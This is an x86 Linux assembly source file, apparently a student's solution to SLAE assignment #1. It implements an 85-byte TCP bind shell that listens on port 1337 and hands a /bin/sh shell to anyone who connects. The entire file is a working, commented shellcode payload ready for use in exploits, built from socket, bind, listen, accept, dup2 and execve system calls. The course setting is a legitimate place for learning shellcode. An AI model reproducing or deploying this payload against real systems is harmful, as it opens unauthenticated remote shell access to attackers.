; Author :      Demey Alexandre (PA-14186)
; Date :        28-04-2020
; 
; Description : SLAE assignment #1 - Shell bind tcp
;               Spawn a tcp bind shell on port 1337
;
; Shellcode length : 85 bytes


global _start

section .text

_start:

;socket(AF_INET, SOCK_STREAM, 0)
;socketcall(SYS_SOCKET, *socket_args)
    xor ebx, ebx        ; set ebx to 0
    mul ebx             ; set eax and edx to 0

    push ebx            ; 0 for the protocol argument
    inc ebx	     
    push ebx            ; SOCK_STREAM
    push byte 0x2       ; AF_INET

    mov ecx, esp        ; ecx points to the socket's arguments
                        ; ebx already set to SYS_SOCKET
    add al, 0x66        ; socketcall 
    int 0x80
    
    xchg edi, eax       ; we save the sockfd returned by socket to edi 
                        ; (xchg is one byte opcode, so best than mov(2 bytes) 
                        ; because we dont care about eax value)

;sockaddr{AF_INET, port, INADDR_ANY}
;bind(sockfd, *addr, addrlen)
;socketcall(SYS_BIND, *socket_args)
    pop    ebx          ; ebx set to SYS_BIND 
                        ; 2 was the last value pushed on the stack
    push   edx          ; INADDR_ANY (bind to 0.0.0.0)
    push word  0x3905   ; the port 1337
    push   bx           ; AF_INET
    mov    ecx,esp      ; ecx point to the sockaddr struct

    push   0x10         ; sockaddr struct length
    push   ecx          ; address to the sockaddr struct
    push   edi          ; sockfd previously saved

    mov    ecx,esp      ; ecx points to the bind's arguments
    push   0x66         ; socketcall
    pop    eax           
    int    0x80

;socketcall(SYS_LISTEN, *socket_args)
;listen(sockfd, backlog)
    push   edx          ; 0, no queue allowed
    push   edi          ; the sockfd previously saved
    mov    ecx,esp      ; ecx point to the listen's arguments
    shl    ebx, 1       ; SYS_LISTEN
                        ; shift one bit left (multiply by 2) so ebx is 4 
                        ; (2 bytes opcode, 3 bytes for: add ebx, 0x2
    mov    al,0x66      ; socketcall
    int    0x80

;socketcall(SYS_ACCEPT, *socket_args)
;accept(sockfd, *addr, *addrlen)
    push   edx          ; null pointer
    push   edx          ; null pointer, we don't care about client informations
    push   edi          ; sockfd
    mov    ecx,esp      ; ecx points to the accept's arguments
    inc    ebx          ; SYS_ACCEPT
    mov    al,0x66      ; socketcall
    int    0x80

;dup2(sockfd, stderr)
;dup2(sockfd, stdout)
;dup2(sockfd, stdin])
    xchg   ebx, eax     ; set ebx to the new sockfd from accept
    push byte 0x3       
    pop    ecx
link:
    dec    ecx          ; set ecx from 2 to 0 (stderr to stdin)
    mov    al,0x3f      ; dup2
    int    0x80
    jne    link         ; if ecx not equal to stdin, overwrite next standard I/O stream

;execve("/bin//sh", NULL, NULL) 

    push   edx          ; string terminator 0x00
    push   0x68732f2f   ; push /bin//sh in reverse order
    push   0x6e69622f
    mov    ebx,esp      ; ebx point to /bin//sh string
                        ; ecx and edx are already set to 0x00 (Null pointer)
    mov    al,0xb       ; execve 
    int    0x80		
